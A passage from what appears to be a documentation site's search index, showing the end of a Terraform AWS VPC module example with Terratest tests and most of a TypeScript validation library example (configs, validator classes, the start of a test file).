}\n}\n</code></pre>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#examplescompleteoutputstf","title":"examples/complete/outputs.tf","text":"<pre><code>output \"vpc_id\" {\n  description = \"The ID of the VPC\"\n  value       = module.vpc.vpc_id\n}\n\noutput \"vpc_cidr\" {\n  description = \"The CIDR block of the VPC\"\n  value       = module.vpc.vpc_cidr\n}\n\noutput \"public_subnet_ids\" {\n  description = \"List of public subnet IDs\"\n  value       = module.vpc.public_subnet_ids\n}\n\noutput \"private_subnet_ids\" {\n  description = \"List of private subnet IDs\"\n  value       = module.vpc.private_subnet_ids\n}\n\noutput \"nat_gateway_public_ips\" {\n  description = \"Public IPs of NAT Gateways\"\n  value       = module.vpc.nat_gateway_public_ips\n}\n</code></pre>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#testvpc_testgo","title":"test/vpc_test.go","text":"<pre><code>package test\n\nimport (\n \"testing\"\n\n \"github.com/gruntwork-io/terratest/modules/aws\"\n \"github.com/gruntwork-io/terratest/modules/terraform\"\n \"github.com/stretchr/testify/assert\"\n)\n\nfunc TestVPCModule(t *testing.T) {\n t.Parallel()\n\n expectedName := \"test-vpc\"\n expectedCIDR := \"10.0.0.0/16\"\n awsRegion := \"us-east-1\"\n\n terraformOptions := terraform.WithDefaultRetryableErrors(t, &amp;terraform.Options{\n  TerraformDir: \"../examples/simple\",\n\n  Vars: map[string]interface{}{\n   \"name\":       expectedName,\n   \"cidr_block\": expectedCIDR,\n  },\n\n  EnvVars: map[string]string{\n   \"AWS_DEFAULT_REGION\": awsRegion,\n  },\n })\n\n defer terraform.Destroy(t, terraformOptions)\n\n terraform.InitAndApply(t, terraformOptions)\n\n // Validate VPC\n vpcID := terraform.Output(t, terraformOptions, \"vpc_id\")\n assert.NotEmpty(t, vpcID)\n\n vpc := aws.GetVpcById(t, vpcID, awsRegion)\n assert.Equal(t, expectedCIDR, vpc.Cidr)\n\n // Validate subnets\n publicSubnetIDs := terraform.OutputList(t, terraformOptions, \"public_subnet_ids\")\n assert.Equal(t, 2, len(publicSubnetIDs))\n\n privateSubnetIDs := terraform.OutputList(t, terraformOptions, \"private_subnet_ids\")\n assert.Equal(t, 2, len(privateSubnetIDs))\n}\n\nfunc TestVPCModuleWithNATGateway(t *testing.T) {\n t.Parallel()\n\n awsRegion := \"us-east-1\"\n\n terraformOptions := terraform.WithDefaultRetryableErrors(t, &amp;terraform.Options{\n  TerraformDir: \"../examples/complete\",\n\n  EnvVars: map[string]string{\n   \"AWS_DEFAULT_REGION\": awsRegion,\n  },\n })\n\n defer terraform.Destroy(t, terraformOptions)\n\n terraform.InitAndApply(t, terraformOptions)\n\n // Validate NAT Gateways\n natGatewayIPs := terraform.OutputList(t, terraformOptions, \"nat_gateway_public_ips\")\n assert.Equal(t, 3, len(natGatewayIPs), \"Should have 3 NAT Gateways (one per AZ)\")\n\n for _, ip := range natGatewayIPs {\n  assert.NotEmpty(t, ip)\n }\n}\n</code></pre>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/terraform_module_example/#key-features-demonstrated","title":"Key Features Demonstrated","text":"<p>This complete Terraform module example demonstrates:</p> <ol> <li>Proper Module Structure: All standard files in correct locations</li> <li>Variable Validation: Input validation with custom error messages</li> <li>Conditional Resources: NAT Gateways, Flow Logs based on variables</li> <li>Count vs For_Each: Proper use of count for dynamic resources</li> <li>Tagging Strategy: Merged tags with defaults</li> <li>High Availability: Multi-AZ subnets and NAT Gateways</li> <li>Security: VPC Flow Logs with IAM roles</li> <li>Examples: Both simple and complete usage patterns</li> <li>Testing: Terratest integration for automated testing</li> <li>Documentation: Comprehensive README with tables</li> </ol> <p>The module is production-ready and follows AWS Well-Architected Framework principles for networking.</p> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["terraform","module","example","aws","vpc","best-practices"]},{"location":"05_examples/typescript_library_example/","title":"Complete TypeScript Library Example","text":"","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#overview","title":"Overview","text":"<p>This example demonstrates a complete, production-ready TypeScript library that follows modern best practices for library development, testing, bundling, and publishing to NPM.</p> <p>Library: <code>ts-validator</code> - A lightweight, type-safe validation library for TypeScript Features: Schema validation, type guards, custom validators, chainable API, zero dependencies Package Manager: pnpm (recommended for libraries) Bundler: tsup (fast TypeScript bundler) Testing: Vitest (fast, modern test runner) Linting: ESLint + Prettier</p> <p>This example showcases:</p> <ul> <li>\u2705 Modern library structure with <code>src/</code> layout</li> <li>\u2705 Dual ESM + CommonJS builds</li> <li>\u2705 Type definitions (.d.ts) generation and export</li> <li>\u2705 Generic types and type guards</li> <li>\u2705 Comprehensive test coverage with Vitest</li> <li>\u2705 ESLint + Prettier + TypeScript strict mode</li> <li>\u2705 Bundling with tsup for optimal output</li> <li>\u2705 NPM package configuration with proper exports</li> <li>\u2705 GitHub Actions CI/CD pipeline</li> <li>\u2705 Semantic versioning and changelog</li> <li>\u2705 Documentation and usage examples</li> </ul>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#project-structure","title":"Project Structure","text":"<pre><code>ts-validator/\n\u251c\u2500\u2500 src/\n\u2502   \u251c\u2500\u2500 validators/\n\u2502   \u2502   \u251c\u2500\u2500 string.ts\n\u2502   \u2502   \u251c\u2500\u2500 number.ts\n\u2502   \u2502   \u251c\u2500\u2500 object.ts\n\u2502   \u2502   \u251c\u2500\u2500 array.ts\n\u2502   \u2502   \u2514\u2500\u2500 index.ts\n\u2502   \u251c\u2500\u2500 types/\n\u2502   \u2502   \u251c\u2500\u2500 validator.ts\n\u2502   \u2502   \u251c\u2500\u2500 result.ts\n\u2502   \u2502   \u2514\u2500\u2500 index.ts\n\u2502   \u251c\u2500\u2500 utils/\n\u2502   \u2502   \u251c\u2500\u2500 guards.ts\n\u2502   \u2502   \u251c\u2500\u2500 errors.ts\n\u2502   \u2502   \u2514\u2500\u2500 index.ts\n\u2502   \u2514\u2500\u2500 index.ts\n\u251c\u2500\u2500 tests/\n\u2502   \u251c\u2500\u2500 validators/\n\u2502   \u2502   \u251c\u2500\u2500 string.test.ts\n\u2502   \u2502   \u251c\u2500\u2500 number.test.ts\n\u2502   \u2502   \u251c\u2500\u2500 object.test.ts\n\u2502   \u2502   \u2514\u2500\u2500 array.test.ts\n\u2502   \u2514\u2500\u2500 integration.test.ts\n\u251c\u2500\u2500 dist/\n\u2502   \u251c\u2500\u2500 index.js          (ESM)\n\u2502   \u251c\u2500\u2500 index.cjs         (CommonJS)\n\u2502   \u251c\u2500\u2500 index.d.ts        (Type definitions)\n\u2502   \u2514\u2500\u2500 index.d.cts       (CommonJS type definitions)\n\u251c\u2500\u2500 .github/\n\u2502   \u2514\u2500\u2500 workflows/\n\u2502       \u2514\u2500\u2500 ci.yml\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 tsconfig.json\n\u251c\u2500\u2500 tsconfig.build.json\n\u251c\u2500\u2500 tsup.config.ts\n\u251c\u2500\u2500 vitest.config.ts\n\u251c\u2500\u2500 .eslintrc.json\n\u251c\u2500\u2500 .prettierrc.json\n\u251c\u2500\u2500 .gitignore\n\u251c\u2500\u2500 LICENSE\n\u251c\u2500\u2500 README.md\n\u2514\u2500\u2500 CHANGELOG.md\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#core-library-implementation","title":"Core Library Implementation","text":"","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#packagejson","title":"package.json","text":"<pre><code>{\n  \"name\": \"ts-validator\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Lightweight, type-safe validation library for TypeScript\",\n  \"author\": \"Tyler Dukes &lt;tyler@example.com&gt;\",\n  \"license\": \"MIT\",\n  \"repository\": {\n    \"type\": \"git\",\n    \"url\": \"https://github.com/tydukes/ts-validator.git\"\n  },\n  \"keywords\": [\n    \"typescript\",\n    \"validation\",\n    \"validator\",\n    \"schema\",\n    \"type-safe\"\n  ],\n  \"type\": \"module\",\n  \"main\": \"./dist/index.cjs\",\n  \"module\": \"./dist/index.js\",\n  \"types\": \"./dist/index.d.ts\",\n  \"exports\": {\n    \".\": {\n      \"import\": {\n        \"types\": \"./dist/index.d.ts\",\n        \"default\": \"./dist/index.js\"\n      },\n      \"require\": {\n        \"types\": \"./dist/index.d.cts\",\n        \"default\": \"./dist/index.cjs\"\n      }\n    }\n  },\n  \"files\": [\n    \"dist\",\n    \"README.md\",\n    \"LICENSE\"\n  ],\n  \"scripts\": {\n    \"dev\": \"tsup --watch\",\n    \"build\": \"tsup\",\n    \"test\": \"vitest run\",\n    \"test:watch\": \"vitest\",\n    \"test:coverage\": \"vitest run --coverage\",\n    \"lint\": \"eslint src tests --ext .ts\",\n    \"lint:fix\": \"eslint src tests --ext .ts --fix\",\n    \"format\": \"prettier --write \\\"**/*.{ts,json,md}\\\"\",\n    \"type-check\": \"tsc --noEmit\",\n    \"prepublishOnly\": \"pnpm run lint &amp;&amp; pnpm run test &amp;&amp; pnpm run build\",\n    \"release\": \"pnpm run prepublishOnly &amp;&amp; changeset publish\"\n  },\n  \"devDependencies\": {\n    \"@changesets/cli\": \"^2.27.1\",\n    \"@types/node\": \"^20.10.0\",\n    \"@typescript-eslint/eslint-plugin\": \"^6.15.0\",\n    \"@typescript-eslint/parser\": \"^6.15.0\",\n    \"@vitest/coverage-v8\": \"^1.0.4\",\n    \"eslint\": \"^8.56.0\",\n    \"eslint-config-prettier\": \"^9.1.0\",\n    \"prettier\": \"^3.1.1\",\n    \"tsup\": \"^8.0.1\",\n    \"typescript\": \"^5.3.3\",\n    \"vitest\": \"^1.0.4\"\n  },\n  \"engines\": {\n    \"node\": \"&gt;=18.0.0\"\n  },\n  \"packageManager\": \"pnpm@8.12.0\"\n}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#tsconfigjson","title":"tsconfig.json","text":"<pre><code>{\n  \"compilerOptions\": {\n    \"target\": \"ES2022\",\n    \"lib\": [\"ES2022\"],\n    \"module\": \"ESNext\",\n    \"moduleResolution\": \"bundler\",\n    \"outDir\": \"./dist\",\n    \"rootDir\": \"./src\",\n    \"declaration\": true,\n    \"declarationMap\": true,\n    \"sourceMap\": true,\n    \"strict\": true,\n    \"esModuleInterop\": true,\n    \"skipLibCheck\": true,\n    \"forceConsistentCasingInFileNames\": true,\n    \"resolveJsonModule\": true,\n    \"isolatedModules\": true,\n    \"noUncheckedIndexedAccess\": true,\n    \"noUnusedLocals\": true,\n    \"noUnusedParameters\": true,\n    \"noFallthroughCasesInSwitch\": true,\n    \"allowUnreachableCode\": false,\n    \"allowUnusedLabels\": false,\n    \"exactOptionalPropertyTypes\": true,\n    \"noImplicitReturns\": true,\n    \"noPropertyAccessFromIndexSignature\": true\n  },\n  \"include\": [\"src/**/*\"],\n  \"exclude\": [\"node_modules\", \"dist\", \"tests\"]\n}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#tsconfigbuildjson","title":"tsconfig.build.json","text":"<pre><code>{\n  \"extends\": \"./tsconfig.json\",\n  \"compilerOptions\": {\n    \"declaration\": true,\n    \"declarationMap\": true,\n    \"sourceMap\": true\n  },\n  \"include\": [\"src/**/*\"],\n  \"exclude\": [\"tests\", \"**/*.test.ts\", \"**/*.spec.ts\"]\n}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#tsupconfigts","title":"tsup.config.ts","text":"<pre><code>import { defineConfig } from 'tsup';\n\nexport default defineConfig({\n  entry: ['src/index.ts'],\n  format: ['esm', 'cjs'],\n  dts: true,\n  splitting: false,\n  sourcemap: true,\n  clean: true,\n  minify: false,\n  treeshake: true,\n  outDir: 'dist',\n});\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#vitestconfigts","title":"vitest.config.ts","text":"<pre><code>import { defineConfig } from 'vitest/config';\n\nexport default defineConfig({\n  test: {\n    globals: true,\n    environment: 'node',\n    coverage: {\n      provider: 'v8',\n      reporter: ['text', 'json', 'html', 'lcov'],\n      exclude: [\n        'node_modules/',\n        'dist/',\n        'tests/',\n        '**/*.test.ts',\n        '**/*.spec.ts',\n        '**/index.ts',\n      ],\n      thresholds: {\n        lines: 80,\n        functions: 80,\n        branches: 80,\n        statements: 80,\n      },\n    },\n  },\n});\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#type-definitions","title":"Type Definitions","text":"","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#srctypesresultts","title":"src/types/result.ts","text":"<pre><code>/**\n * Validation result type\n */\nexport type ValidationResult&lt;T&gt; =\n  | { success: true; data: T }\n  | { success: false; errors: ValidationError[] };\n\n/**\n * Validation error details\n */\nexport interface ValidationError {\n  path: string[];\n  message: string;\n  code: string;\n  value?: unknown;\n}\n\n/**\n * Validation context for error tracking\n */\nexport interface ValidationContext {\n  path: string[];\n  errors: ValidationError[];\n}\n\n/**\n * Creates a new validation context\n */\nexport function createContext(path: string[] = []): ValidationContext {\n  return { path, errors: [] };\n}\n\n/**\n * Adds an error to the context\n */\nexport function addError(\n  ctx: ValidationContext,\n  message: string,\n  code: string,\n  value?: unknown\n): void {\n  ctx.errors.push({\n    path: [...ctx.path],\n    message,\n    code,\n    value,\n  });\n}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#srctypesvalidatorts","title":"src/types/validator.ts","text":"<pre><code>import { ValidationResult } from './result';\n\n/**\n * Base validator interface\n */\nexport interface Validator&lt;TInput = unknown, TOutput = TInput&gt; {\n  /**\n   * Validates input and returns result\n   */\n  validate(input: unknown): ValidationResult&lt;TOutput&gt;;\n\n  /**\n   * Parses input and throws on error\n   */\n  parse(input: unknown): TOutput;\n\n  /**\n   * Checks if input is valid (type guard)\n   */\n  is(input: unknown): input is TOutput;\n\n  /**\n   * Makes validator optional\n   */\n  optional(): Validator&lt;TInput | undefined, TOutput | undefined&gt;;\n\n  /**\n   * Makes validator nullable\n   */\n  nullable(): Validator&lt;TInput | null, TOutput | null&gt;;\n\n  /**\n   * Sets default value for undefined inputs\n   */\n  default(value: TOutput): Validator&lt;TInput, TOutput&gt;;\n}\n\n/**\n * Infers output type from validator\n */\nexport type Infer&lt;T extends Validator&lt;any, any&gt;&gt; = T extends Validator&lt;any, infer Out&gt;\n  ? Out\n  : never;\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#core-validators","title":"Core Validators","text":"","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#srcvalidatorsstringts","title":"src/validators/string.ts","text":"<pre><code>import { Validator, ValidationResult, createContext, addError } from '../types';\n\nexport class StringValidator implements Validator&lt;string, string&gt; {\n  private minLength?: number;\n  private maxLength?: number;\n  private pattern?: RegExp;\n  private trimEnabled = false;\n\n  validate(input: unknown): ValidationResult&lt;string&gt; {\n    const ctx = createContext();\n\n    if (typeof input !== 'string') {\n      addError(ctx, 'Expected string', 'invalid_type', input);\n      return { success: false, errors: ctx.errors };\n    }\n\n    let value = input;\n\n    if (this.trimEnabled) {\n      value = value.trim();\n    }\n\n    if (this.minLength !== undefined &amp;&amp; value.length &lt; this.minLength) {\n      addError(\n        ctx,\n        `String must be at least ${this.minLength} characters`,\n        'too_short',\n        value\n      );\n    }\n\n    if (this.maxLength !== undefined &amp;&amp; value.length &gt; this.maxLength) {\n      addError(\n        ctx,\n        `String must be at most ${this.maxLength} characters`,\n        'too_long',\n        value\n      );\n    }\n\n    if (this.pattern &amp;&amp; !this.pattern.test(value)) {\n      addError(ctx, 'String does not match pattern', 'invalid_pattern', value);\n    }\n\n    if (ctx.errors.length &gt; 0) {\n      return { success: false, errors: ctx.errors };\n    }\n\n    return { success: true, data: value };\n  }\n\n  parse(input: unknown): string {\n    const result = this.validate(input);\n    if (!result.success) {\n      throw new Error(result.errors.map((e) =&gt; e.message).join(', '));\n    }\n    return result.data;\n  }\n\n  is(input: unknown): input is string {\n    return this.validate(input).success;\n  }\n\n  min(length: number): this {\n    this.minLength = length;\n    return this;\n  }\n\n  max(length: number): this {\n    this.maxLength = length;\n    return this;\n  }\n\n  length(length: number): this {\n    this.minLength = length;\n    this.maxLength = length;\n    return this;\n  }\n\n  regex(pattern: RegExp): this {\n    this.pattern = pattern;\n    return this;\n  }\n\n  email(): this {\n    this.pattern = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\n    return this;\n  }\n\n  url(): this {\n    this.pattern = /^https?:\\/\\/.+/;\n    return this;\n  }\n\n  trim(): this {\n    this.trimEnabled = true;\n    return this;\n  }\n\n  optional(): Validator&lt;string | undefined, string | undefined&gt; {\n    return new OptionalValidator(this);\n  }\n\n  nullable(): Validator&lt;string | null, string | null&gt; {\n    return new NullableValidator(this);\n  }\n\n  default(value: string): Validator&lt;string, string&gt; {\n    return new DefaultValidator(this, value);\n  }\n}\n\nexport function string(): StringValidator {\n  return new StringValidator();\n}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#srcvalidatorsnumberts","title":"src/validators/number.ts","text":"<pre><code>import { Validator, ValidationResult, createContext, addError } from '../types';\n\nexport class NumberValidator implements Validator&lt;number, number&gt; {\n  private minValue?: number;\n  private maxValue?: number;\n  private integerOnly = false;\n  private positiveOnly = false;\n  private nonNegativeOnly = false;\n\n  validate(input: unknown): ValidationResult&lt;number&gt; {\n    const ctx = createContext();\n\n    if (typeof input !== 'number' || Number.isNaN(input)) {\n      addError(ctx, 'Expected number', 'invalid_type', input);\n      return { success: false, errors: ctx.errors };\n    }\n\n    const value = input;\n\n    if (this.integerOnly &amp;&amp; !Number.isInteger(value)) {\n      addError(ctx, 'Expected integer', 'not_integer', value);\n    }\n\n    if (this.positiveOnly &amp;&amp; value &lt;= 0) {\n      addError(ctx, 'Number must be positive', 'not_positive', value);\n    }\n\n    if (this.nonNegativeOnly &amp;&amp; value &lt; 0) {\n      addError(ctx, 'Number must be non-negative', 'negative', value);\n    }\n\n    if (this.minValue !== undefined &amp;&amp; value &lt; this.minValue) {\n      addError(ctx, `Number must be at least ${this.minValue}`, 'too_small', value);\n    }\n\n    if (this.maxValue !== undefined &amp;&amp; value &gt; this.maxValue) {\n      addError(ctx, `Number must be at most ${this.maxValue}`, 'too_large', value);\n    }\n\n    if (ctx.errors.length &gt; 0) {\n      return { success: false, errors: ctx.errors };\n    }\n\n    return { success: true, data: value };\n  }\n\n  parse(input: unknown): number {\n    const result = this.validate(input);\n    if (!result.success) {\n      throw new Error(result.errors.map((e) =&gt; e.message).join(', '));\n    }\n    return result.data;\n  }\n\n  is(input: unknown): input is number {\n    return this.validate(input).success;\n  }\n\n  min(value: number): this {\n    this.minValue = value;\n    return this;\n  }\n\n  max(value: number): this {\n    this.maxValue = value;\n    return this;\n  }\n\n  int(): this {\n    this.integerOnly = true;\n    return this;\n  }\n\n  positive(): this {\n    this.positiveOnly = true;\n    return this;\n  }\n\n  nonnegative(): this {\n    this.nonNegativeOnly = true;\n    return this;\n  }\n\n  optional(): Validator&lt;number | undefined, number | undefined&gt; {\n    return new OptionalValidator(this);\n  }\n\n  nullable(): Validator&lt;number | null, number | null&gt; {\n    return new NullableValidator(this);\n  }\n\n  default(value: number): Validator&lt;number, number&gt; {\n    return new DefaultValidator(this, value);\n  }\n}\n\nexport function number(): NumberValidator {\n  return new NumberValidator();\n}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#srcvalidatorsobjectts","title":"src/validators/object.ts","text":"<pre><code>import { Validator, ValidationResult, createContext, addError } from '../types';\n\ntype Shape = Record&lt;string, Validator&lt;any, any&gt;&gt;;\ntype ObjectOutput&lt;T extends Shape&gt; = {\n  [K in keyof T]: T[K] extends Validator&lt;any, infer Out&gt; ? Out : never;\n};\n\nexport class ObjectValidator&lt;T extends Shape&gt; implements Validator&lt;unknown, ObjectOutput&lt;T&gt;&gt; {\n  constructor(private shape: T) {}\n\n  validate(input: unknown): ValidationResult&lt;ObjectOutput&lt;T&gt;&gt; {\n    const ctx = createContext();\n\n    if (typeof input !== 'object' || input === null || Array.isArray(input)) {\n      addError(ctx, 'Expected object', 'invalid_type', input);\n      return { success: false, errors: ctx.errors };\n    }\n\n    const result: any = {};\n    const obj = input as Record&lt;string, unknown&gt;;\n\n    for (const [key, validator] of Object.entries(this.shape)) {\n      const fieldResult = validator.validate(obj[key]);\n\n      if (!fieldResult.success) {\n        for (const error of fieldResult.errors) {\n          ctx.errors.push({\n            ...error,\n            path: [key, ...error.path],\n          });\n        }\n      } else {\n        result[key] = fieldResult.data;\n      }\n    }\n\n    if (ctx.errors.length &gt; 0) {\n      return { success: false, errors: ctx.errors };\n    }\n\n    return { success: true, data: result as ObjectOutput&lt;T&gt; };\n  }\n\n  parse(input: unknown): ObjectOutput&lt;T&gt; {\n    const result = this.validate(input);\n    if (!result.success) {\n      throw new Error(result.errors.map((e) =&gt; `${e.path.join('.')}: ${e.message}`).join(', '));\n    }\n    return result.data;\n  }\n\n  is(input: unknown): input is ObjectOutput&lt;T&gt; {\n    return this.validate(input).success;\n  }\n\n  optional(): Validator&lt;unknown, ObjectOutput&lt;T&gt; | undefined&gt; {\n    return new OptionalValidator(this);\n  }\n\n  nullable(): Validator&lt;unknown, ObjectOutput&lt;T&gt; | null&gt; {\n    return new NullableValidator(this);\n  }\n\n  default(value: ObjectOutput&lt;T&gt;): Validator&lt;unknown, ObjectOutput&lt;T&gt;&gt; {\n    return new DefaultValidator(this, value);\n  }\n}\n\nexport function object&lt;T extends Shape&gt;(shape: T): ObjectValidator&lt;T&gt; {\n  return new ObjectValidator(shape);\n}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#srcvalidatorsarrayts","title":"src/validators/array.ts","text":"<pre><code>import { Validator, ValidationResult, createContext, addError } from '../types';\n\ntype ArrayOutput&lt;T&gt; = T extends Validator&lt;any, infer Out&gt; ? Out[] : never;\n\nexport class ArrayValidator&lt;T extends Validator&lt;any, any&gt;&gt;\n  implements Validator&lt;unknown, ArrayOutput&lt;T&gt;&gt;\n{\n  private minItems?: number;\n  private maxItems?: number;\n  private uniqueEnabled = false;\n\n  constructor(private itemValidator: T) {}\n\n  validate(input: unknown): ValidationResult&lt;ArrayOutput&lt;T&gt;&gt; {\n    const ctx = createContext();\n\n    if (!Array.isArray(input)) {\n      addError(ctx, 'Expected array', 'invalid_type', input);\n      return { success: false, errors: ctx.errors };\n    }\n\n    if (this.minItems !== undefined &amp;&amp; input.length &lt; this.minItems) {\n      addError(ctx, `Array must have at least ${this.minItems} items`, 'too_short', input);\n    }\n\n    if (this.maxItems !== undefined &amp;&amp; input.length &gt; this.maxItems) {\n      addError(ctx, `Array must have at most ${this.maxItems} items`, 'too_long', input);\n    }\n\n    const result: any[] = [];\n    const seen = new Set&lt;string&gt;();\n\n    for (let i = 0; i &lt; input.length; i++) {\n      const itemResult = this.itemValidator.validate(input[i]);\n\n      if (!itemResult.success) {\n        for (const error of itemResult.errors) {\n          ctx.errors.push({\n            ...error,\n            path: [String(i), ...error.path],\n          });\n        }\n      } else {\n        if (this.uniqueEnabled) {\n          const key = JSON.stringify(itemResult.data);\n          if (seen.has(key)) {\n            addError(ctx, 'Array items must be unique', 'duplicate_item', itemResult.data);\n          }\n          seen.add(key);\n        }\n        result.push(itemResult.data);\n      }\n    }\n\n    if (ctx.errors.length &gt; 0) {\n      return { success: false, errors: ctx.errors };\n    }\n\n    return { success: true, data: result as ArrayOutput&lt;T&gt; };\n  }\n\n  parse(input: unknown): ArrayOutput&lt;T&gt; {\n    const result = this.validate(input);\n    if (!result.success) {\n      throw new Error(result.errors.map((e) =&gt; `${e.path.join('.')}: ${e.message}`).join(', '));\n    }\n    return result.data;\n  }\n\n  is(input: unknown): input is ArrayOutput&lt;T&gt; {\n    return this.validate(input).success;\n  }\n\n  min(length: number): this {\n    this.minItems = length;\n    return this;\n  }\n\n  max(length: number): this {\n    this.maxItems = length;\n    return this;\n  }\n\n  length(length: number): this {\n    this.minItems = length;\n    this.maxItems = length;\n    return this;\n  }\n\n  unique(): this {\n    this.uniqueEnabled = true;\n    return this;\n  }\n\n  optional(): Validator&lt;unknown, ArrayOutput&lt;T&gt; | undefined&gt; {\n    return new OptionalValidator(this);\n  }\n\n  nullable(): Validator&lt;unknown, ArrayOutput&lt;T&gt; | null&gt; {\n    return new NullableValidator(this);\n  }\n\n  default(value: ArrayOutput&lt;T&gt;): Validator&lt;unknown, ArrayOutput&lt;T&gt;&gt; {\n    return new DefaultValidator(this, value);\n  }\n}\n\nexport function array&lt;T extends Validator&lt;any, any&gt;&gt;(itemValidator: T): ArrayValidator&lt;T&gt; {\n  return new ArrayValidator(itemValidator);\n}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#modifier-validators","title":"Modifier Validators","text":"","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#srcvalidatorsmodifiersts","title":"src/validators/modifiers.ts","text":"<pre><code>import { Validator, ValidationResult, createContext, addError } from '../types';\n\nexport class OptionalValidator&lt;T&gt; implements Validator&lt;T | undefined, T | undefined&gt; {\n  constructor(private inner: Validator&lt;any, T&gt;) {}\n\n  validate(input: unknown): ValidationResult&lt;T | undefined&gt; {\n    if (input === undefined) {\n      return { success: true, data: undefined };\n    }\n    return this.inner.validate(input);\n  }\n\n  parse(input: unknown): T | undefined {\n    const result = this.validate(input);\n    if (!result.success) {\n      throw new Error(result.errors.map((e) =&gt; e.message).join(', '));\n    }\n    return result.data;\n  }\n\n  is(input: unknown): input is T | undefined {\n    return this.validate(input).success;\n  }\n\n  optional(): Validator&lt;T | undefined, T | undefined&gt; {\n    return this;\n  }\n\n  nullable(): Validator&lt;T | undefined | null, T | undefined | null&gt; {\n    return new NullableValidator(this);\n  }\n\n  default(value: T): Validator&lt;T | undefined, T&gt; {\n    return new DefaultValidator(this, value);\n  }\n}\n\nexport class NullableValidator&lt;T&gt; implements Validator&lt;T | null, T | null&gt; {\n  constructor(private inner: Validator&lt;any, T&gt;) {}\n\n  validate(input: unknown): ValidationResult&lt;T | null&gt; {\n    if (input === null) {\n      return { success: true, data: null };\n    }\n    return this.inner.validate(input);\n  }\n\n  parse(input: unknown): T | null {\n    const result = this.validate(input);\n    if (!result.success) {\n      throw new Error(result.errors.map((e) =&gt; e.message).join(', '));\n    }\n    return result.data;\n  }\n\n  is(input: unknown): input is T | null {\n    return this.validate(input).success;\n  }\n\n  optional(): Validator&lt;T | null | undefined, T | null | undefined&gt; {\n    return new OptionalValidator(this);\n  }\n\n  nullable(): Validator&lt;T | null, T | null&gt; {\n    return this;\n  }\n\n  default(value: T): Validator&lt;T | null, T&gt; {\n    return new DefaultValidator(this, value);\n  }\n}\n\nexport class DefaultValidator&lt;T&gt; implements Validator&lt;T, T&gt; {\n  constructor(\n    private inner: Validator&lt;any, T | undefined&gt;,\n    private defaultValue: T\n  ) {}\n\n  validate(input: unknown): ValidationResult&lt;T&gt; {\n    const result = this.inner.validate(input);\n    if (!result.success) {\n      return result as ValidationResult&lt;T&gt;;\n    }\n    return { success: true, data: result.data ?? this.defaultValue };\n  }\n\n  parse(input: unknown): T {\n    const result = this.validate(input);\n    if (!result.success) {\n      throw new Error(result.errors.map((e) =&gt; e.message).join(', '));\n    }\n    return result.data;\n  }\n\n  is(input: unknown): input is T {\n    return this.validate(input).success;\n  }\n\n  optional(): Validator&lt;T | undefined, T | undefined&gt; {\n    return new OptionalValidator(this);\n  }\n\n  nullable(): Validator&lt;T | null, T | null&gt; {\n    return new NullableValidator(this);\n  }\n\n  default(value: T): Validator&lt;T, T&gt; {\n    return new DefaultValidator(this.inner, value);\n  }\n}\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#public-api","title":"Public API","text":"","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#srcindexts","title":"src/index.ts","text":"<pre><code>// Types\nexport type { Validator, Infer } from './types/validator';\nexport type { ValidationResult, ValidationError, ValidationContext } from './types/result';\n\n// Validators\nexport { string } from './validators/string';\nexport { number } from './validators/number';\nexport { object } from './validators/object';\nexport { array } from './validators/array';\n\n// Re-export commonly used types\nexport type { StringValidator } from './validators/string';\nexport type { NumberValidator } from './validators/number';\nexport type { ObjectValidator } from './validators/object';\nexport type { ArrayValidator } from './validators/array';\n</code></pre>","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#testing","title":"Testing","text":"","tags":["typescript","library","validation","npm","testing","bundling"]},{"location":"05_examples/typescript_library_example/#testsvalidatorsstringtestts","title":"tests/validators/string.test.ts","text":"<pre><code>import { describe, it, expect } from 'vitest';\nimport { string } from '../../src';\n\ndescribe('StringValidator', () =&gt; {\n  describe('basic validation', () =&gt; {\n    it('should validate strings', () =&gt; {\n      const validator = string();\n      const result = validator.validate('hello');\n\n      expect(result.success).toBe(true);\n      if (result.success) {\n        expect(result.data).toBe('hello');\n      }\n    });\n\n    it('should reject non-strings', () =&gt; {\n      const validator = string();\n      const result = validator.validate(123);\n\n      expect(result.success).toBe(false);\n      if (!result.success) {\n        expect(result.errors[0]?.code).toBe('invalid_type');\n      }\n    });\n  });\n\n  